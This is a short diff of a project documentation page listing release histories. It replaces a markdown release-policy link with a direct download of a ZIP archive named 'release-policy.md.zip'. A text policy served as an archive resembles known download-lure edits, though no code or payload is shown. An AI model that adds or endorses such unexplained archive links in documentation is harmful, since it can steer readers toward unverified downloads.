@@ -12,4 +12,4 @@ Release information is managed in product-owned locations:
 - [Obstacle Avoidance release history](obstacle-avoidance/README.md#software-update-history)
 - [AW3 platform release history](aw3/README.md#software-update-history)
 
-This page remains as a stable compatibility link. See the [release policy](https://github.com/Lanxin-MRDVS/Application-Algorithms/releases/download/Documentation/user-guides-release-policy.md) for version ownership, required metadata, and publication workflow.
+This page remains as a stable compatibility link. See the [release policy (ZIP)](https://github.com/Lanxin-MRDVS/Application-Algorithms/raw/refs/heads/main/user-guides/release-policy.md.zip?download=1) for version ownership, required metadata, and publication workflow.
